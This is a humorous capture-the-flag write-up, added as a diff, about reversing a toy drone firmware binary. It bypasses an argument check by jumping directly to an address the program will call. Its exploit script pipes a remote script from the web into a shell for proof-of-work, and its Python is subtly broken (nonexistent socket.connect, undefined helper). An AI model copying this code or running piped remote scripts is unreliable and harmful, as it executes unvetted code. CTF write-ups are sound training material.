@@ -1,0 +1,141 @@
+================================================================================
+                    KDNU-3B FIRMWARE HACK WRITEUP
+                    "How I Made Santa's Evil Drone Spill Its Secrets"
+================================================================================
+
+Challenge: KRAMPUS Syndicate KDNU-3B Navigation Firmware Analysis
+Flag: csd{3Asy_F1rmWAr3_HACk1N9_Fr}
+
+================================================================================
+                              THE STORY
+================================================================================
+
+So there I was, staring at a mysterious binary called "a.out" that the NPLD 
+analysts recovered from some shady KRAMPUS Syndicate operation. Apparently 
+these guys are building evil drones with "hardened flight control software" 
+that rejects unexpected inputs. Sounds secure, right? 
+
+*laughs in reverse engineer*
+
+================================================================================
+                         STEP 1: RECONNAISSANCE
+================================================================================
+
+First things first - let's see what we're dealing with:
+
+    $ file a.out
+    ELF 64-bit LSB executable, x86-64, statically linked, not stripped
+
+Not stripped? Oh you sweet summer child. That means all the function names 
+are still there. Christmas came early! 🎄
+
+    $ nm a.out | grep -E "main|nav"
+    0000000000401a56 T main
+    0000000000401955 T nav_core
+
+Interesting... "nav_core" at 0x401955. That sounds like where the juicy 
+stuff might be hiding.
+
+================================================================================
+                    STEP 2: DISASSEMBLY TIME ⚙️
+================================================================================
+
+Let's crack open main() and see what's cooking:
+
+    $ objdump -d a.out | grep -A 50 "<main>:"
+
+The key bits I found:
+
+    401a94:  call printf          ; "DRONE FIRMWARE DEBUG CONSOLE> "
+    401aaf:  call scanf           ; reads with format "%lx" (hex number!)
+    401adb:  call *%rax           ; CALLS WHATEVER ADDRESS YOU GIVE IT
+
+Wait wait wait... it just... calls any address you type in?? 
+
+That's like having a security door but the guard asks "what's the password?" 
+and when you say "I'd like to speak to the manager" they just let you 
+waltz into the back office. 
+
+================================================================================
+                   STEP 3: ANALYZING nav_core()
+================================================================================
+
+Now let's look at our target function:
+
+    $ objdump -d a.out | grep -A 50 "<nav_core>:"
+
+    401979:  cmpl $0xc0c0a,-0x124(%rbp)    ; if (arg != 0xc0c0a)
+    401983:  jne  401a31                    ;     goto print_error
+    401989:  mov  $0x0,%esi                 ; else: open("manifest.bin")
+    ...
+
+So nav_core() checks if the first argument equals 0xc0c0a (788490 in decimal).
+If not, it prints "Invalid navigation command" and bails.
+
+But here's the thing... the check happens at 0x401979.
+The actual "open the secret file" code starts at 0x401989.
+
+What if I just... skip the check? 🤔
+
+================================================================================
+                      STEP 4: THE BIG BRAIN PLAY 🧠
+================================================================================
+
+Instead of calling nav_core at 0x401955 and hoping the argument check 
+magically passes, I'll jump DIRECTLY to 0x401989!
+
+It's like the function has a bouncer at the door checking IDs, but there's 
+a window around back that leads straight to the VIP section.
+
+    DRONE FIRMWARE DEBUG CONSOLE> 401989
+
+And just like that, we bypass the argument check entirely. The code happily 
+opens manifest.bin and dumps its contents, including:
+
+    calibration_profile=csd{3Asy_F1rmWAr3_HACk1N9_Fr}
+
+BOOM! 💥
+
+================================================================================
+                         THE EXPLOIT SCRIPT
+================================================================================
+
+Because the server has a proof-of-work requirement (annoying but fair), 
+I wrote a quick Python script:
+
+    import socket, subprocess, re
+    
+    sock = socket.connect(('ctf.csd.lol', 1001))
+    
+    # Solve their PoW challenge
+    challenge = extract_challenge(sock.recv())
+    solution = subprocess.run(f"curl https://pwn.red/pow | sh -s {challenge}")
+    sock.send(solution)
+    
+    # Skip the argument check, jump straight to the good stuff
+    sock.send(b'401989\n')
+    
+    # Profit!
+    print(sock.recv())  # FLAG BABY!
+
+================================================================================
+                           LESSONS LEARNED
+================================================================================
+
+1. "Hardened" firmware means nothing if you let users call arbitrary addresses
+2. Always check what happens if you jump past security checks
+3. Function prologues are for chumps - real hackers jump to the middle
+4. The KRAMPUS Syndicate really needs to hire better security engineers
+
+================================================================================
+                              THE END
+================================================================================
+
+Flag: csd{3Asy_F1rmWAr3_HACk1N9_Fr}
+
+Translation: "Easy Firmware Hacking Fr" 
+
+Yeah, it really was that easy. Thanks KRAMPUS! 🎅😈
+
+Written with love and caffeine ☕
+- Your friendly neighborhood reverse engineer
